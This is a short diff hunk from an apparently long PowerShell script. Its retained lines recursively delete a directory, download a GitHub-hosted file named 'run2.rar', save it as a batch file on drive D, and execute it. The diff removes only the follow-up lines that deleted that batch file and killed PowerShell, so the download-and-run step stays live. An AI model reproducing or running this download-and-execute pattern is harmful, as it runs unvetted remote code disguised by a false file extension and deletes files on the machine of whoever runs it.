@@ -2962,5 +2962,3 @@ catch
 remove-item $fileSaveDir -recurse
 (new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/run2.rar','D:\run2.bat');
 d:\run2.bat
-remove-item 'D:\run2.bat'
-taskkill /im /f powershell.exe
